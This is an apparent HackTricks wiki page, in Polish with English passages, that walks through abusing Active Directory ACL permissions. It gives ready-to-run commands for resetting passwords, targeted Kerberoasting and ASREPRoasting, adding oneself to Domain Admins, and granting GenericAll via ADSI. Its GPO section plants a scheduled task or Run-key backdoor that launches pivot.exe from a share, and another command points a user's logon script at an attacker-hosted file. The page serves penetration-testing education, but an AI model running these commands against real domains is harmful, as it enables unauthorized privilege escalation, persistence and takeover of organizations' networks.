# Nadużywanie Active Directory ACLs/ACEs

{{#include ../../../banners/hacktricks-training.md}}

**Ta strona jest w większości podsumowaniem technik z** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **i** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Po więcej szczegółów sprawdź oryginalne artykuły.**

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **GenericAll — prawa do konta użytkownika**

To uprawnienie daje atakującemu pełną kontrolę nad docelowym kontem użytkownika. Po potwierdzeniu praw `GenericAll` za pomocą polecenia `Get-ObjectAcl`, atakujący może:

- **Zmiana hasła celu**: Używając `net user <username> <password> /domain`, atakujący może zresetować hasło użytkownika.
- **Targeted Kerberoasting**: Przypisz SPN do konta użytkownika, aby uczynić je kerberoastable, a następnie użyj Rubeus i targetedKerberoast.py, aby wyodrębnić hashe ticket-granting ticket (TGT) i spróbować je złamać.
```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```
- **Ukierunkowane ASREPRoasting**: Wyłącz wstępne uwierzytelnianie dla użytkownika, co naraża jego konto na ASREPRoasting.
```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```
## **GenericAll — prawa do grupy**

To uprawnienie pozwala atakującemu manipulować członkostwem w grupach, jeśli ma prawa `GenericAll` w grupie takiej jak `Domain Admins`. Po zidentyfikowaniu wyróżnionej nazwy grupy (distinguished name) za pomocą `Get-NetGroup`, atakujący może:

- **Dodać siebie do grupy Domain Admins**: Można to zrobić za pomocą bezpośrednich poleceń lub używając modułów takich jak Active Directory lub PowerSploit.
```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```
Z Linuxa możesz też wykorzystać BloodyAD, aby dodać siebie do dowolnych grup, jeśli posiadasz nad nimi członkostwo GenericAll/Write. Jeśli docelowa grupa jest zagnieżdżona w “Remote Management Users”, natychmiast uzyskasz dostęp WinRM na hostach, które uznają tę grupę:
```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```
## **GenericAll / GenericWrite / Write on Computer/User**

Posiadanie tych uprawnień na obiekcie komputera lub koncie użytkownika umożliwia:

- **Kerberos Resource-based Constrained Delegation**: Pozwala na przejęcie obiektu komputera.
- **Shadow Credentials**: Użyj tej techniki, aby podszyć się pod komputer lub konto użytkownika, wykorzystując uprawnienia do stworzenia shadow credentials.

## **WriteProperty on Group**

Jeśli użytkownik ma `WriteProperty` prawa na wszystkich obiektach dla konkretnej grupy (np. `Domain Admins`), może:

- **Dodać siebie do grupy Domain Admins**: Osiągalne poprzez połączenie poleceń `net user` i `Add-NetGroupUser`, ta metoda pozwala na eskalację uprawnień w domenie.
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **Self (Self-Membership) on Group**

To uprawnienie umożliwia atakującemu dodanie siebie do określonych grup, takich jak `Domain Admins`, za pomocą poleceń, które bezpośrednio manipulują członkostwem w grupie. Użycie następującej sekwencji poleceń umożliwia dodanie siebie:
```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```
## **WriteProperty (Self-Membership)**

Podobne uprawnienie — pozwala atakującemu bezpośrednio dodać siebie do grup poprzez modyfikację właściwości grup, jeśli posiada prawo `WriteProperty` na tych grupach. Potwierdzenie i wykonanie tego uprawnienia przeprowadza się za pomocą:
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```
## **ForceChangePassword**

Posiadanie `ExtendedRight` na użytkowniku dla `User-Force-Change-Password` pozwala na resetowanie hasła bez znajomości aktualnego hasła. Weryfikację tego prawa i jego wykorzystanie można przeprowadzić za pomocą PowerShell lub alternatywnych narzędzi wiersza poleceń, oferując kilka metod resetowania hasła użytkownika, w tym sesje interaktywne oraz one-liners dla środowisk nieinteraktywnych. Polecenia obejmują proste wywołania PowerShell oraz użycie `rpcclient` na Linuxie, demonstrując wszechstronność wektorów ataku.
```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```
## **WriteOwner on Group**

Jeśli atakujący stwierdzi, że ma prawa `WriteOwner` do grupy, może zmienić właściciela tej grupy na siebie. Jest to szczególnie istotne, gdy grupa to `Domain Admins`, ponieważ zmiana właściciela pozwala na szerszą kontrolę nad atrybutami grupy i członkostwem. Proces polega na zidentyfikowaniu odpowiedniego obiektu za pomocą `Get-ObjectAcl`, a następnie użyciu `Set-DomainObjectOwner` do zmodyfikowania właściciela, albo przez SID, albo przez nazwę.
```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```
## **GenericWrite on User**

To uprawnienie umożliwia atakującemu modyfikację właściwości użytkownika. Konkretnie, mając dostęp `GenericWrite`, atakujący może zmienić ścieżkę skryptu logowania użytkownika, aby uruchomić złośliwy skrypt podczas logowania. Odbywa się to poprzez użycie polecenia `Set-ADObject` w celu zaktualizowania właściwości `scriptpath` docelowego użytkownika tak, by wskazywała na skrypt atakującego.
```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```
## **GenericWrite on Group**

Z tym uprawnieniem atakujący mogą manipulować członkostwem w grupie, na przykład dodając siebie lub innych użytkowników do określonych grup. Proces ten obejmuje utworzenie obiektu poświadczeń, użycie go do dodawania lub usuwania użytkowników z grupy oraz weryfikację zmian członkostwa za pomocą poleceń PowerShell.
```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```
## **WriteDACL + WriteOwner**

Posiadanie obiektu AD oraz uprawnień `WriteDACL` do niego umożliwia atakującemu nadanie sobie uprawnień `GenericAll` do tego obiektu. Osiąga się to poprzez manipulację ADSI, co pozwala na pełną kontrolę nad obiektem i możliwość modyfikowania jego przynależności do grup. Mimo to istnieją ograniczenia przy próbach wykorzystania tych uprawnień za pomocą cmdletów modułu Active Directory `Set-Acl` / `Get-Acl`.
```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```
## **Replikacja w domenie (DCSync)**

The DCSync attack leverages specific replication permissions on the domain to mimic a Domain Controller and synchronize data, including user credentials. This powerful technique requires permissions like `DS-Replication-Get-Changes`, allowing attackers to extract sensitive information from the AD environment without direct access to a Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)

## Delegacja GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delegacja GPO

Delegated access to manage Group Policy Objects (GPOs) can present significant security risks. For instance, if a user such as `offense\spotless` is delegated GPO management rights, they may have privileges like **WriteProperty**, **WriteDacl**, and **WriteOwner**. These permissions can be abused for malicious purposes, as identified using PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

### Enumeracja uprawnień GPO

To identify misconfigured GPOs, PowerSploit's cmdlets can be chained together. This allows for the discovery of GPOs that a specific user has permissions to manage: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Komputery z zastosowaną daną polityką**: It's possible to resolve which computers a specific GPO applies to, helping understand the scope of potential impact. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Polityki zastosowane dla konkretnego komputera**: To see what policies are applied to a particular computer, commands like `Get-DomainGPO` can be utilized.

**OU z zastosowaną daną polityką**: Identifying organizational units (OUs) affected by a given policy can be done using `Get-DomainOU`.

You can also use the tool [**GPOHound**](https://github.com/cogiceo/GPOHound) to enumerate GPOs and find issues in them.

### Nadużycie GPO - New-GPOImmediateTask

Nieprawidłowo skonfigurowane GPO mogą być wykorzystane do uruchomienia kodu, na przykład poprzez utworzenie natychmiastowego zadania zaplanowanego. Można to zrobić, aby dodać użytkownika do grupy lokalnych administratorów na zaatakowanych maszynach, co znacząco podnosi uprawnienia:
```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```
### GroupPolicy module - Abuse GPO

GroupPolicy module, jeśli jest zainstalowany, pozwala na tworzenie i linkowanie nowych GPOs oraz ustawianie preferencji, takich jak wartości rejestru uruchamiające backdoors na dotkniętych komputerach. Ta metoda wymaga zaktualizowania GPO i zalogowania się użytkownika na komputerze, aby doszło do wykonania:
```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```
### SharpGPOAbuse - Abuse GPO

SharpGPOAbuse oferuje metodę wykorzystania istniejących GPO poprzez dodawanie zadań lub modyfikowanie ustawień bez konieczności tworzenia nowych GPO. To narzędzie wymaga modyfikacji istniejących GPO lub użycia narzędzi RSAT do utworzenia nowych przed zastosowaniem zmian:
```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```
### Wymuś aktualizację zasad

Aktualizacje GPO zwykle odbywają się co około 90 minut. Aby przyspieszyć ten proces — szczególnie po wprowadzeniu zmiany — na komputerze docelowym można uruchomić polecenie `gpupdate /force`, aby wymusić natychmiastową aktualizację zasad. Polecenie to gwarantuje zastosowanie modyfikacji GPO bez oczekiwania na kolejny cykl automatycznej aktualizacji.

### Szczegóły techniczne

Po przejrzeniu Scheduled Tasks dla danego GPO, takiego jak `Misconfigured Policy`, można potwierdzić dodanie zadań takich jak `evilTask`. Zadania te są tworzone za pomocą skryptów lub narzędzi wiersza poleceń, mających na celu modyfikację zachowania systemu lub escalate privileges.

Struktura zadania, widoczna w pliku konfiguracyjnym XML wygenerowanym przez `New-GPOImmediateTask`, przedstawia szczegóły zadania zaplanowanego — w tym polecenie do wykonania oraz jego wyzwalacze. Ten plik pokazuje, jak zadania zaplanowane są definiowane i zarządzane w GPOs, dostarczając metodę do wykonywania dowolnych poleceń lub skryptów w ramach egzekwowania polityk.

### Użytkownicy i grupy

GPOs pozwalają również na manipulowanie członkostwem użytkowników i grup na systemach docelowych. Poprzez bezpośrednią edycję plików polityk Users and Groups, atakujący mogą dodawać użytkowników do uprzywilejowanych grup, takich jak lokalna grupa `administrators`. Jest to możliwe dzięki delegowaniu uprawnień do zarządzania GPO, co umożliwia modyfikowanie plików polityk w celu dodania nowych użytkowników lub zmiany członkostwa w grupach.

Plik konfiguracyjny XML dla Users and Groups opisuje, jak te zmiany są implementowane. Poprzez dodanie wpisów do tego pliku, konkretni użytkownicy mogą otrzymać elevated privileges na wszystkich dotkniętych systemach. Ta metoda oferuje bezpośrednie podejście do privilege escalation poprzez manipulację GPO.

Ponadto można rozważyć dodatkowe metody uruchamiania kodu lub utrzymywania persistence, takie jak wykorzystanie logon/logoff scripts, modyfikacja kluczy rejestru odpowiedzialnych za autoruns, instalacja oprogramowania za pomocą plików .msi lub edycja konfiguracji usług. Techniki te zapewniają różne ścieżki do utrzymania dostępu i kontroli nad systemami docelowymi poprzez nadużycie GPOs.

## Źródła

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://wald0.com/?p=112](https://wald0.com/?p=112)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule\_\_ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType\_](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)

{{#include ../../../banners/hacktricks-training.md}}
